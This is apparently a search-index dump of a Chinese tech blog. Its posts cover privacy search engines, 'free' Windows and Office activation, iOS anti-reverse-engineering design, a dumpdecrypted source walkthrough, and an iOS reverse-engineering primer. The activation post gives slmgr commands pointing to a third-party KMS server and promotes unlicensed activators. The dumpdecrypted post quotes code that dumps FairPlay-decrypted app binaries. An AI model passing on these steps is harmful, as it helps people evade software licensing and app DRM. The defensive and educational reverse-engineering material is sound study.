Searx，一个基于Python的完全开源免费搜索引擎平台，为你提供来自Google、Bing、Yahoo等70多种各大视频、图片、搜索、磁力等网站结果展示，并对搜索结果进行优化，同时不会存储你的任何搜索信息。支持用户自行安装搭建。如果自己暂时没有这个想法或者能力地话，那么这里有一份searx的公开站台可以使用。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:10:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Yacy YaCy是一个基于p2p的分布式开源免费的网页搜索引擎系统，任何人都可以用YaCy为自己建立个人的搜索门户，以实现信息的自由共享。YaCy采用多种机制保护用户的隐私，YaCy网络基于点对点连接，而不是通过中央服务器进行搜索查询，保证内容不被审查，而且所有的搜索请求都被加密，搜索结果不会被中央服务器记录和分析。由于该搜索引擎是基于Java语言进行开发的，所以安装Yacy程序之前必须保证自己的电脑已经安装了Java。总的来说，这个搜索引擎对于新手极为不友好，上手难度高，门槛高，但是搜索能力和隐私保护能力却是一流的。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:11:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Yandex Yandex搜索引擎是俄罗斯Yandex公司开发的一款搜索引擎，Yandex是目前世界第五大搜索引擎，在俄国内拥有逾60%的市场占有率，也是欧洲市场上较为流行的搜索引擎。由于搜索引擎结果经常会混杂大量的俄语，所以对于中文用户来说体验并不算太好。但是，国内似乎可以正常地访问。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:12:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"OneSearch OneSearch实际上并不是一款全新的搜索引擎，相反，它是一个基于微软Bing定制的搜索引擎。 这款引擎的主要亮点是它不会对用户进行追踪、储存他们的数据或跟广告商分享用户个人或搜索数据。换言之，用户的个人信息基本不会被出售第三方。但是OneSearch也依赖广告盈利。不过它不是根据cookie或用户浏览历史而是通过搜索关键字等因素显示情景广告。如果使用了高级隐私模式的用户，该搜索引擎的结果链接将会在一小时后失效。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:13:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"BraveSearch 这是brave公司刚推出不久的搜索引擎，目前还是beta阶段，对于中文的部分检索词不是很准确。但是界面美观，没有明显的广告，不分析用户行为，也不追踪用户，也是一款注重用户隐私的搜索引擎。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:14:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Oscobo Oscobo是专门为了保护用户隐私而创立的搜索引擎，它不会跟踪用户信息。对用户的搜索字词完全加密，因此只有用户自己知道搜索的内容，对于中文搜索也算还可以，值得试试。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:15:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Discrete Search Discrete Search 是一种元搜索引擎，不会跟踪任何可识别的信息。对于那些以干净和用户友好的形式寻求快速结果的人来说，这是一个不错的选择。它使用端到端加密来使您的搜索尽可能保密。但是对于中文搜索极为不友好，不适合用来检索中文关键词。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:16:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Swisscows 这是一款由瑞士Hulbee AG 科技公司开发的语义搜索引擎，它使用人工智能和机器学习来评估用户搜索的上下文，同时与前面的隐私保护搜索引擎一样，它并不会收集用户的任何信息，对于中文关键词检索的支持也很友好。唯一的问题就是搜索引擎主页有广告。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:17:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"gibiru Gibiru 是从改进的 Google 算法中获取搜索结果，为用户提供可靠的结果。它不会在您的系统上安装各种个性化和跟踪 cookie。同样也是注重用户隐私的搜索引擎。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:18:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Search Encrypt Search Encrypt 使用本地加密来保护您的搜索。它结合了 AES-256 加密和安全套接字层加密。搜索加密然后从其搜索合作伙伴网络中检索您的搜索结果。完成搜索后，即使其他人可以访问您的计算机，您的搜索字词也会过期，因此它们是私密的，用户无需担心自己的搜索内容被他人窥探。唯一的不足就是搜索引擎主页有广告存在。 从效率上来说：在海量信息时代，一个优秀的搜索引擎总是能让我们事半功倍。 从安全隐私上来说：在互联网公司虎视眈眈下，一个注重用户隐私的搜索引擎能在我们保护个人隐私时助我们一臂之力。 我没法说哪一个搜索引擎是最优秀的，因为它们各有千秋，我们各取所需。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:19:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"参考 相关词条参考于维基百科同名词条以及各自的官方说明文档/博客。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:20:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["激活","Windows","Office"],"content":"免费激活Windows和Office Windows系统和office办公软件都是我们现在学习，工作中很难离开的工具。由于各种各样的原因，可能有些人会出现Windows未被激活，office产品密钥过期等情况。所以，在这里列举一下如何免费的激活Windows和office。 ","date":"2021-11-29","objectID":"/zh-cn/30-1/:0:0","tags":["激活","Windows","Office"],"title":"免费激活Windows和Office","uri":"/zh-cn/30-1/"},{"categories":["激活","Windows","Office"],"content":"Windows激活 关于Windows的激活方式一般分为数字权利激活和KMS在线激活。 数字权利激活 数字权利激活会把当前电脑的硬件信息，上传至微软服务器。当用户重装系统后，设备会自动与服务器中存储的信息进行对比。如果相符，则自动激活。所以，这种激活方式对于用户来说是非常的方便的，有好的。 首先介绍一个专门用于激活Windows10的数字权利激活工具——云萌激活 功能 以数字权利激活Windows10系统（涵盖各个版本） 云萌激活： 云萌Windows 10激活工具 - 首页 GitHub开源地址 这是一款开源免费的数字权利激活工具，你可以使用他免费激活windows10系统。只需要简单的几步操作就可以完成。 激活步骤 中文版 下载 Releases 里的 .exe 发行文件。 运行它。 点按 Activate 按钮。 完成~ 可以说是十分的简单易用。 KMS服务器激活 密钥管理服务（KMS）是微软为批量许可客户（组织，学校或政府）提供的一种正版激活方法。KMS激活期限最多可以长达180天（6个月），激活每7天自动进行更新（期限自动重置为180天），也就是说如果客户端可以一直连接到KMS主机服务器，那么是可以无限制的使用下去。 但是对于一些非Windows10系统的用户来说，上面的工具爱莫能助，所以我们需要一款更加强大的激活工具——HEU KMS Activator GitHub发布地址 功能介绍 支持KMS激活Microsoft Windows、Office； 2、支持数字许可永久激活、KMS38激活至2038年； 3、支持OEM激活Windows Vista, Windows 7, Windwos Server； 4、支持Microsoft Office 零售版转换为VL批量许可版； 5、支持备份和还原激活信息。 6、支持自定义搭建KMS服务器激活； —激活成功率高、执行速度快、支持几乎所有版本； —在Windows 7上无需依赖安装.NET Framework； —可以自行安装或搭建KMS服务器； —自动识别三种语言（简/繁/英）； —带参数可静默运行且参数可根据需要自选； —可以一键自动激活、也可以根据需要自选； —包含KMS相关的功能（安装密钥、激活状态查询等） —完全可离线激活，也可以连接网络服务器进行激活； 正因为这款激活工具几乎可以解决Windows电脑上所有的激活服务，所以在GitHub上也只是以文件的形式上传，并没有将工具代码开源，个人自行选择是否使用。 激活步骤 1.打开HEU KMS Activator 并选择一个激活方式(下面以数字激活为例) 2.点击数字激活，点击“橘黄色按钮”，将激活 Windows 和 Office，智能识别最佳 的激活方式（优先顺序依次为数字许可证/KMS38/OEM/KMS），并自动跳过已经 永久激活的版本。 3.完成(更多的激活方式自行选择和查询) 产品密钥激活 其实产品密钥激活算不上是另一种激活形式，只是换了一种激活方式。根据密钥的性质（数字权利还是KMS激活密钥）来决定你的设备激活状态。 如果你能确定自己的密钥是数字权利密钥，那么你可以直接打开设置-更新和安全-激活-更换产品密钥。将你手里面的密钥输入进入激活即可。 但是如果你是KMS密钥的话建议通过代码来进行激活，代码如下： slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX(这里输入你自己的产品密钥) slmgr /skms kms.03k.org slmgr /ato 这样用代码激活的好处就是，当激活使用时间达到180天后，他会自动帮你激活，这样你就不需要再通过手动激活了。 密钥获取处:Windows与office激活密钥公益发布站 本着互联网“传递，共享，自由”的原则，我希望大家使用公益站发布的密钥之后，能给他一个关注。 ","date":"2021-11-29","objectID":"/zh-cn/30-1/:0:1","tags":["激活","Windows","Office"],"title":"免费激活Windows和Office","uri":"/zh-cn/30-1/"},{"categories":["激活","Windows","Office"],"content":"office产品激活 office激活除了上面说到的HEU KMS Activator ，但是可能由于代码没有开源的缘故，可能让人觉得不太放心，那么下面的office tool plus也是一个不错的选择。 Office Tool Plus 官方网站 - 一键部署 Office GitHub开源地址 功能 一键生成配置，快速激活office,Office Tool Plus从微软服务器上获取office的版本信息以及安装文件，始终确保下载，安装的office为最新版本。 激活步骤 下载Office Tool Plus之后，激活步骤请参考官方文档，有详细说明。 ","date":"2021-11-29","objectID":"/zh-cn/30-1/:0:2","tags":["激活","Windows","Office"],"title":"免费激活Windows和Office","uri":"/zh-cn/30-1/"},{"categories":["激活","Windows","Office"],"content":"其他方案 也许你实在不想折腾那么多繁琐的步骤，那么你可以使用产品密钥激活(密钥寻找可以前往上面的telegram频道，如果你没有telegram，那就只能求助于万能的网友了)，或者暂时使用office的替代品。我这里推荐两个替代品：一个是WPS,另一个是Libre Office(开源免费，与Office兼容)。 ","date":"2021-11-29","objectID":"/zh-cn/30-1/:0:3","tags":["激活","Windows","Office"],"title":"免费激活Windows和Office","uri":"/zh-cn/30-1/"},{"categories":["激活","Windows","Office"],"content":"参考文章 1.Windows系统激活神器HEU KMS Activator v22.1.0激活工具 2.win10激活的几种方式及其原理 ","date":"2021-11-29","objectID":"/zh-cn/30-1/:0:4","tags":["激活","Windows","Office"],"title":"免费激活Windows和Office","uri":"/zh-cn/30-1/"},{"categories":["iOS","反逆向"],"content":"此文为加密收费内容添加我微信支付后可看: iOS反逆向方案建设思路 地球人都知道，iOS不是安全的，iOS APP更不是安全的。那如果想要提升APP的安全性，就得在网络、数据存储等方面进行建设。而对于iOS APP来说，最常见的安全能力，就是反逆向的能力。 我们先看下逆向的大致步骤，我们之前也在这篇帖子（iOS逆向学习（一）基础）里聊过，基本能分成这么几步： 1). 越狱 2). 砸壳 3). 静态分析 4). 动态调试 5). 重签多开 所以下面我们就按照这个顺序，简单分析每一步常见的技术方案，然后总结下有什么有用的信息，可以用来反逆向能力建设。 ","date":"2021-11-28","objectID":"/zh-cn/30/:0:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"1、越狱 目前来看，越狱是一切逆向操作的首要前提。毕竟只有在越狱环境下，才能砸壳拿到ipa包。同时在越狱环境下，还可以直接进行有限的动态调试。 对于怎么防止iPhone被越狱，这是Apple的工作，就算我们想做也做不到。但是，我们可以尽自己所能的，避免自己的APP在越狱环境下运行。那就需要我们第一，能检测到当前的环境是不是越狱环境。第二，阻止APP启动，或者退出运行中的APP。 怎么检测越狱环境呢？我们得从越狱的目的上来找答案。越狱的目的显而易见，就是获得iOS系统的最高权限。我们先不管怎么去达成这个目的，只要获得了系统的最高权限，我们的APP就能调用一些本来受限的方法，比如getenv。同时越狱工具，也会在文件系统中，遗留一些特有的文件，比如MobileSubstrate之类。总之检测当前是否为越狱环境的方法千千万，就算有些方法会被攻击者使用xCon之类的工具绕过，我们还是能找出更多的方法。 那么检测到了越狱环境以后，我们理所当然的，就要阻止APP的运行，或者停用部分功能。停用部分功能的话，直接在代码里埋开关就可以了。而阻止APP的运行，要么不让APP启动，要么就退出APP。对于阻止APP启动来说，因为启动过程是由系统控制的，所以实现起来有难度，但是我们可以轻而易举的做到退出APP。我们可以构造crah，或者直接调用exit，甚至于间接的执行系统调用，来退出我们的APP。但是，退出APP的方法，都是有局限容易被攻破的，这块后面我们再详细聊。 ","date":"2021-11-28","objectID":"/zh-cn/30/:1:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"2、砸壳 砸壳这块我们能做的其实不多，因为砸壳工具的原理，是和我们APP自身逻辑无关的。所以我们只好在上一步预防，也就是阻止我们的APP在越狱环境运行。 更多关于砸壳原理的介绍，可以参照之前的帖子： iOS逆向学习（二）砸壳原理之dumpdecrypted iOS逆向学习（三）砸壳原理之frida-ios-dump ","date":"2021-11-28","objectID":"/zh-cn/30/:2:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"3、静态分析 到了这里，攻击者已经拿到了ipa文件。接下来，攻击者会使用下面这些常见的手段，来对我们的ipa进行静态分析： class-dump：导出所有OC代码的.h文件并分析 MachOView：直接阅读分析Mach-O文件 IDA/Hopper：进行反编译并分析汇编代码 那该怎么阻止静态分析呢？答案就是混淆。 混淆分成两种，一种是高级语言层面的混淆，也就是大家常说的代码混淆、硬编码混淆。我们平时写代码的时候，为了阅读方便，写的类名、方法名，都会多多少少的跟代码功能挂钩。比如用到了manager字样的，大多就是管理器，但是这也同样方便了攻击者进行静态分析。所以代码混淆的目的，就是在编译打包环节，把易于理解的类名、方法名，通过一定规则，替换成难以理解的形式，比如直接MD5。不过需要注意的是，大规模乱码式的代码混淆，可能会面临审核被拒的风险。其次硬编码混淆的作用，就是对代码中的字符串硬编码进行加密，以避免攻击者可以直接阅读。对于高级语言层面的混淆，更多的细节讨论，可以参照我之前的帖子： iOS硬编码混淆 除了上面说的高级语言层面的混淆，我们还可以做汇编语言层面的混淆。这块的实现，主要是建立在LLVM的修改上的。具体细节我还没开始研究，不过这里有个开源的工具链接，感兴趣的话可以先自己研究下： Obfuscator-LLVM ","date":"2021-11-28","objectID":"/zh-cn/30/:3:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"4、动态调试 动态调试的方法其实很多，可以在越狱环境下，直接运行APP以后，使用LLDB指令或者Cycript工具进行调试。也可以把ipa包集成到MonkeyDev工程里，然后在非越狱环境下，使用XCode进行动态调试。先不管两种方式的区别，其共同点都在于，我们的APP能正常运行，或者说至少不退出，攻击者才有机会进行操作。那该怎样操作呢？ 对于在越狱环境下的动态调试，我们可以采用越狱环境检测+APP主动退出的方案。而对于非越狱环境下的XCode调试，就可以采用debug状态检测+APP主动退出的方案。越狱环境检测的方案前面说过了，我们来聊下debug状态检测+APP主动退出。现在常见的检测方案大致有下面几种： ptrace：直接阻止XCode调试，更多原理分析可以参照之前的帖子：细说ptrace反调试 sysctl：检测是否处于debug状态，需要手动退出APP isatty：同上 ioctl：同上 其他的方案大家也可以自己搜索一下，总的来说。debug状态检测的技术实现方案并不多，就算加上汇编化之类的变种也是有限的。所以攻击者可以消耗较少的精力，来绕过这些检测。 除去上面说的两种防御方案，我们发现攻击者采用的动态调试方案，大多还是依赖dylib注入的。所以我们还可以通过__RESTRICT设置，来禁止dylib注入。但是很不幸，__RESTRICT可以通过修改可执行文件的源文件绕过，所以也比较容易攻破。 ","date":"2021-11-28","objectID":"/zh-cn/30/:4:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"5、重签多开 重签多开的意思，是指攻击者用自己的证书，对我们的ipa包进行重签名，并同时运行多个，这是黑产常用的一种手段。那怎么预防？老样子，先检测。 我们知道，每个iOS应用都有着唯一的ID，也就是bundleID，而想要实现重签多开，就必然要改变原有的bundleID。所以，这个环节的防御，我们主要还是集中在对Info.plist文件的改动检测上。我们可以直接通过系统API NSBundle来读取Info.plist文件信息，也可以通过对应的CoreFoundation方法来做。当然这两种方式显而易见是不安全的，攻击者随手写个hook就可以攻破。所以我们就换个方式，使用其他的方案直接读取Info.plist文件，比如NSData、mmap、拷贝一份改个名字再读等等等等。反正读取文件的方式千千万，可以让攻击者疲于奔命。 那检测到了以后，怎么阻止呢？也是同样的道理，我们可以选择功能关闭或者退出APP。而在前面的部分，我们也说过主动退出APP的方式是不好的，至于为什么不好，我们现在来聊一聊。 我们可以选择的主动退出APP的方案，其实并不多。主要就是构造crash、调用terminateWithSuccess之类的上层API、调用exit之类的系统底层API。要想攻破这些并不困难，对于crash可以根据栈帧定位我们的崩溃代码，上层API直接hook就好。exit之类的底层API，如果是直接使用那也就直接hook搞定。如果是汇编化的变种，直接使用IDA修改源文件就行。 更多的APP主动退出方法，可以参照我的开源实验工程：https://github.com/BenArvin/iOSAppExitTest ","date":"2021-11-28","objectID":"/zh-cn/30/:5:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","反逆向"],"content":"6、反逆向方案 前面我们聊完了攻击者常用的逆向方法，和对应的防御方案，那么我们的反逆向方案应该设计成什么样子呢？ 首先，我们要明白，我们的一切工作，都不能完全的防御所有攻击，我们所做的只是增加攻击者的攻击成本。所以，对于主动退出APP这种技术方案有限，攻击者在攻击时有迹可循的防御方案，我们都不应该投入精力去建设。相应的，我们的反逆向方案，应该建设成下面的样子： 1）编写阶段：对核心功能，采用C语言、汇编语言等静态语言编写 2）编译阶段混淆：代码混淆、硬编码混淆、资源文件混淆、汇编混淆等 3）运行阶段逆向检测：越狱环境检测、重签多开检测等 4）运行阶段功能限制：代码开关、封号、封手机等 ","date":"2021-11-28","objectID":"/zh-cn/30/:6:0","tags":["iOS","反逆向"],"title":"iOS反逆向方案建设思路","uri":"/zh-cn/30/"},{"categories":["iOS","逆向"],"content":"此文为加密收费内容添加我微信支付后可看: iOS逆向学习（二）砸壳原理之dumpdecrypted ","date":"2021-11-28","objectID":"/zh-cn/29-2/:0:0","tags":["iOS","逆向"],"title":"iOS逆向学习（二）砸壳原理之dumpdecrypted","uri":"/zh-cn/29-2/"},{"categories":["iOS","逆向"],"content":"1、基本原理 从AppStore中下载的包，是被苹果使用FairPlay技术加密的，没办法直接重签名给其他人用，也不能做IDA分析之类的逆向操作。所以为了得到没有加密的包，就需要进行砸壳操作。 看完Mach-O文件跟dyld加载介绍后，使劲拍拍脑袋能想到两种砸壳思路： 1、直接破解FairPlay加密技术：很可惜暂时做不到，还没有公开的破解方案出来 2、从APP的加载运行入手，越过解密阶段，直接从内存中读取被dyld解密后的内容 所以目前常见的砸壳工作，都是使用第二种思路来做的，这里我们以dumpdecrypted为例进行分析。 ","date":"2021-11-28","objectID":"/zh-cn/29-2/:1:0","tags":["iOS","逆向"],"title":"iOS逆向学习（二）砸壳原理之dumpdecrypted","uri":"/zh-cn/29-2/"},{"categories":["iOS","逆向"],"content":"2、dumpdecrypted dumpdecrypted分为初代stefanesser做的版本，和后面conradev改进的版本。但其原理基本不变，改进版主要是为了能够dump出动态加载库。咱们这次的分析以改进版的为例，先看使用步骤： 1、make生成.dylib文件 2、使用ssh把dylib文件放入目标app的沙盒路径下 3、执行砸壳并导出砸壳后的ipa文件 除了使用步骤以外，dumpdecrypted还要求手机中已经安装了cycript。所以我们不难看出，dumpdecrypted是通过dylid的方式，介入到dyld的加载过程中的。 然后再看源码，主要定义了三个函数：dumptofile、image_added、dumpexecutable，没有main函数。但可以看出这三个函数大致的调用关系，是dumpexecutable -\u003e image_added -\u003e dumptofile。继续分析，dumpexecutable是如何被调用的呢。答案在于其方法定义上： __attribute__((constructor)) static void dumpexecutable() { } 把换行去掉，就成了 __attribute__((constructor)) static void dumpexecutable() { } 其中比较特殊的是__attribute__((constructor))这一段，可以大致理解成使用这段话，让我们新定义的dumpexecutable方法，在main函数之前被执行。而其得以做到的原因，就在于首先constructor函数，是在main函数之前执行的，而__attribute__修饰，又使得我们新定义的方法，可以和constructor一道，在main函数之前执行。这部分更详细的解释可以参照GUNC的文档 The constructor attribute causes the function to be called automatically before execution enters main (). 所以重新梳理一下大致的调用关系：constructor -\u003e dumpexecutable -\u003e image_added -\u003e dumptofile，需要注意这里说的调用关系仅仅是大致的。 弄清了整个的启动时机后，再看dumpexecutable函数内部，实际的操作只做了一件事：_dyld_register_func_for_add_image(\u0026image_added);。因为咱们已经意识到整个砸壳过程是跟dyld有关的，所以可以从dyld源码中找到对_dyld_register_func_for_add_image的解释 /* * _dyld_register_func_for_add_image registers the specified function to be * called when a new image is added (a bundle or a dynamic shared library) to * the program. When this function is first registered it is called for once * for each image that is currently part of the program. */ void _dyld_register_func_for_add_image( void (*func)(const struct mach_header *mh, intptr_t vmaddr_slide)) 大致的意思，就是说注册了一个监听方法，用于监听bundle或者动态加载库的加载事件，而且加载事件，对于每个bundle或者动态库仅会触发一次。到这里，我们就可以梳理出整个砸壳工具的逻辑顺序了： 1、伴随constructor函数的调用，在main函数执行前，调用dumpexecutable函数 2、在dumpexecutable函数中，注册bundle或动态库的加载事件监听，而且其响应方法是image_added函数 3、当bundle或者动态库被加载时，触发事件监听，调用image_added方法，并向其传递header结构体指针，和另外一个不知道有什么用的参数slide 4、然后在image_added方法内，调用dumptofile函数，进行真正的文件导出工作 所以到这里，我们转向dumptofile函数，看一下其内部实现。越过前面的变量定义，首先看这一段 /* extract basename */ tmp = strrchr(rpath, '/'); printf(\"\\n\\n\"); if (tmp == NULL) { printf(\"[-] Unexpected error with filename.\\n\"); _exit(1); } else { printf(\"[+] Dumping %s\\n\", tmp+1); } 这块的作用，是把路径进行裁剪，得到目标APP的文件名。然后下面这一段： /* detect if this is a arm64 binary */ if (mh-\u003emagic == MH_MAGIC_64) { lc = (struct load_command *)((unsigned char *)mh + sizeof(struct mach_header_64)); printf(\"[+] detected 64bit ARM binary in memory.\\n\"); } else { /* we might want to check for other errors here, too */ lc = (struct load_command *)((unsigned char *)mh + sizeof(struct mach_header)); printf(\"[+] detected 32bit ARM binary in memory.\\n\"); } 大致的作用，是通过对Mach-O文件中，header的magic字段进行判断，判断当前可执行文件是32还是64位的。然后，因为Mach-O文件的内容是连续的，所以可以通过header指针加上header区间大小的方式，拿到load commands的指针。 拿到了指针之后，再下一段代码 for (i=0; i\u003cmh-\u003encmds; i++) { if (lc-\u003ecmd == LC_ENCRYPTION_INFO || lc-\u003ecmd == LC_ENCRYPTION_INFO_64) { 通过mh-\u003encmds得到load commands数量，对所有load command进行遍历。而在for循环内部，则对load command进行类型判断，只有当是LC_ENCRYPTION_INFO或者LC_ENCRYPTION_INFO_64类型时，才进入下一步。在Mach-O文档里没有找到LC_ENCRYPTION_INFO，但是可以google一下，大致的意思是加密相关的。所以我们可以把这个if语句，简单的理解成过滤加密相关的load command。然后继续深入if语句内部，首先是这么一段： eic = (struct encryption_info_command *)lc; /* If this load command is present, but data is not crypted then exit */ if (eic-\u003ecryptid == 0) { break; } 为了理解这段，得先看encryption_info_command的定义： /* * The encryption_info_command contains the file offset and size of an * of an encrypted segment. */ struct encryption_info_command { uint32_t cmd; /* LC_ENCRYPTION_INFO */ uint32_t cmdsize; /* sizeof(struct encryption_info_command) */ uint32_t cryptoff; /* file offset of encrypted range */ uint32_t cryptsize; /* file size of encrypted range */ uint32_t cryptid; /* which enryption system, 0 means not-encrypted yet */ }; 然后结合这段代码的注释理解下，大致意思可能是说从LC_ENCRYPTION_INFO类型的load command，取出数据的加密状态，如果不是被加密的状态就中断执行。继续往下看这一段： off_cryptid=(off_t)((void*)\u0026eic-\u003ecryptid - (void*)mh); printf(\"[+] offset to cryptid found: @%p(from %p) = %x\\n\", \u0026eic-\u003ecryptid, mh, off_cryptid); printf(\"[+] Found encrypted data at address %08x of length %u ","date":"2021-11-28","objectID":"/zh-cn/29-2/:2:0","tags":["iOS","逆向"],"title":"iOS逆向学习（二）砸壳原理之dumpdecrypted","uri":"/zh-cn/29-2/"},{"categories":["iOS","逆向"],"content":"3、参考资料 Mach-O文档：https://web.archive.org/web/20090901205800/http://developer.apple.com/mac/library/documentation/DeveloperTools/Conceptual/MachORuntime/Reference/reference.html#//apple_ref/doc/uid/TP40000895-CH248-95908 dyld源码：https://github.com/opensource-apple/dyld ","date":"2021-11-28","objectID":"/zh-cn/29-2/:3:0","tags":["iOS","逆向"],"title":"iOS逆向学习（二）砸壳原理之dumpdecrypted","uri":"/zh-cn/29-2/"},{"categories":["iOS","逆向"],"content":"此文为加密收费内容添加我微信支付后可看: iOS逆向学习（一）基础 因为工作原因，最近开始接触iOS逆向这块，所以在这里记录、总结一下。这一篇主要是基本知识、常用工具。 一、基本知识 首先，逆向一款APP，我们需要什么环境？那当然是一部越狱手机。手机越狱的方法这里不讨论，总之我们需要一部越狱的手机，来获取APP的ipa包，以及后面的动态debug等逆向操作。 Tips: 越狱手机的系统版本不限，只要能装上并运行我们想要逆向的APP就好。例如我们想要逆向的APP最低支持iOS8，那么越狱手机的系统版本，只要大于等于8就行。 有了越狱手机以后，我们就可以正式开始逆向了。常见的逆向操作，大致分成下面这几步： 应用砸壳` -\u003e `静态/动态分析` -\u003e `代码注入` -\u003e `打包重签名 后面的内容，我们也按照这样的顺序来展开。 二、砸壳 之所以需要砸壳这一步，是因为苹果会对发布包的ipa进行加密。常见的砸壳工具，有下面这三种： Clutch dumpdecrypted frida-ios-dump 这三种砸壳工具的使用，可以点进链接看说明，或者网上随便搜索一下就能找到一大堆帖子教你怎么用。所以，这里就不重复使用方法了。但有两个很重要的点需要注意： 砸壳后的包，必须在越狱机、非越狱机上都能安装、启动成功，才能算得上是砸壳成功 因为部分APP可能做了反逆向处理，所以砸壳成功的包，虽然能安装、启动，但却无法正常运行，甚至启动就闪退。对于反逆向的应对，砸壳阶段不用关注 三、静态/动态分析 这一步的目的，在于通过静态/动态分析的方法，了解并找到我们感兴趣的代码块、逻辑点。但是因为我们目前只有一个砸壳后的ipa包，所以我们就需要一些工具的辅助。 class-dump: 导出所有类的头文件，可以在其中看到类名、公有属性、公有方法的定义，这一步有助于我们大致了解代码块的组成 IDA: 反编译工具，可以把机器代码反编译成汇编代码，甚至可以把部分汇编代码块进一步反编译为OC之类的高级语言，当然还有其他例如调用关系图之类的高级功能 hopper: 和IDA一样的反编译工具，功能虽然没有IDA强大，但其实对于我这种初学者来说也够用了 Reveal: UI层级解析工具，可以像Xcode一样，解析展示APP的UI层级结构，帮助我们理解APP内window、viewController、view之间的关联 cycript: 强大的动态调试工具，可以在APP运行的时候，对APP执行查看、改动操作，详细的使用方法可以参照官网。此外虽然常见的用法是在越狱环境下，但我们也可以通过framework集成的方式，在非越狱环境使用。同样的，操作方法自行搜索 LLDB: 苹果自己提供的动态调试工具，虽然常规情况下只能debug自己的APP，但我们现在可是在越狱环境啊，debug第三方APP？那都不是事儿！第三方APP的debug方法网上搜索可以找到一大把 四、代码注入 那么通过静态/动态的分析之后，我们虽然分析了大致的代码结构，定位了关键目标代码块。但如果我们想不仅仅是观察，更想对原代码原APP进行改动，这时就需要使用代码注入。常见的代码注入，基本都是通过hook的原理去做的。常见的hook工具有下面这几种： Logos Tweak: 使用logos语法（不要怕，语法很简单，看一眼就会），objc、C方法都可以hook。使用方法网上一大把，不过对于logos语法，最好先看一下iPhoneDevWiki上的介绍 CaptainHook: 可以用来hook objc方法 fishhook: 可以用来hook C方法 这三种工具当中，最常用的是logos。需要注意的是，这三种代码注入的方式，都是利用dyld机制实现的。所以无论是在越狱机，还是在非越狱机上都可以执行。而其他的例如怎么hook block之类的，基本也都大同小异，可以自己搜索一下。 当然除了代码注入以外，如果有需要，我们也可以通过直接修改可执行文件的方式，对APP进行修改。工具方面可以使用IDA的keyPatch功能，至于怎么修改，反正我暂时还不会。 五、打包重签名 经过砸壳、分析、注入三步以后，我们已经得到了一份修改后的代码了。但是想要把这份代码打包成新的ipa包进行发布，就还需要进行重签名操作。开源的重签名脚本、工具很多，例如可以直接用ios-app-signer。 六、进一步深入 虽然因为逆向工具的丰富、自动化，砸壳、代码注入、重签名这些工作的技术难度不高了。但是要想不局限于浅层面的玩一玩，而是更进一步的深入学习，下面这几方面的能力很重要： iOS开发经验: 丰富的iOS开发经验真的很重要，特别是在代码的静态/动态分析阶段，有经验的开发朋友，根据类名、方法名、汇编代码，甚至字符串内容、UI层级结构这些少量细节，就能推断出大致的代码结构、逻辑 底层知识: 这部分的底层知识，包括OC语言、iOS操作系统、编译器、汇编等等等等，这种平时业务开发基本用不上的底层知识，在这里却意外的很重要 七、资料工具推荐 iOS逆向论坛: http://iosre.com MonkeyDev: 基于iOSOpenDev的一键逆向开发集成工具，https://github.com/AloneMonkey/MonkeyDev 《iOS应用逆向工程》: 我看完感觉内容有点乱，不过依旧是本好书，亚马逊上可以搜到，作者沙梓社、吴航 《iOS应用逆向与安全》: MonkeyDev作者出的书，https://www.amazon.cn/dp/B07D5952BR/ ","date":"2021-11-28","objectID":"/zh-cn/29-1/:0:0","tags":["iOS","逆向"],"title":"iOS逆向学习（一）基础","uri":"/zh-cn/29-1/"},{"categories":["IOS","逆向"],"content":"此文为加密收费内容添加我微信支付后可看: IOS逆向初探 ","date":"2021-11-28","objectID":"/zh-cn/29/:0:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"0x00 前言 本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。 